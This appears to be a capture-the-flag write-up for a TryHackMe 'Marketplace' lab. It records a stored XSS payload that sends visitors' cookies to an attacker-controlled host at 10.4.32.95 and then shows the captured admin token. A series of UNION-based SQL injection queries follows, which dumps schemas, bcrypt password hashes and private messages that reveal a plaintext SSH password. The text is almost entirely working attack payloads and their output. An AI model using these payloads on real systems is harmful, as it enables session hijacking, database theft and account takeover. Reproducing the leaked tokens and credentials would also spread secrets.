# XSS

XSS payload:
```
<script> document.location= " http://10.4.32.95:8000/cookiegrab.php?c=" + document.cookie; </script>
```

Admin cookie:
```
GET /cookiegrab.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MTY2NjQ3NDl9.lqivh0Jsh8pFKyA6MyHRUkjHV9ZrAK5TGRqU0gJ4rgI HTTP/1.1
```
(Via opt/cookie-stealer-master)

Flag: `THM{c37a63895910e478f28669b048c348d5}`


# SQL

```
user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata
information_schema,marketplace
```
```
user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'
items,messages,users
```
```
user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'
id ,username ,password ,isAdministrator 
```

### Passwords
```
user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users

1:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW:0 ,2:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q:1 ,3:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG:1 
,4:1:$2b$10$Fyjv6TPcejwLDkkLwTQg0O7Lnzf/E.o7f0cxbS552XVoULpjkphUO:0 

```

### Messages
```
user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'
id ,user_from ,user_to ,message_content ,is_read 
```
```
user=0 union select 1,group_concat(id,':',user_from,':',user_to,':',message_content,'\n'),3,4 from marketplace.messages

1:1:3:Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ , 
2:1:4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! ,3:1:4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules. ,
4:1:4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! ,
5:1:4:Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers. 
```
Now we have ssh credentials: 
`jake:@b_ENXkGYUCAv3zJ`
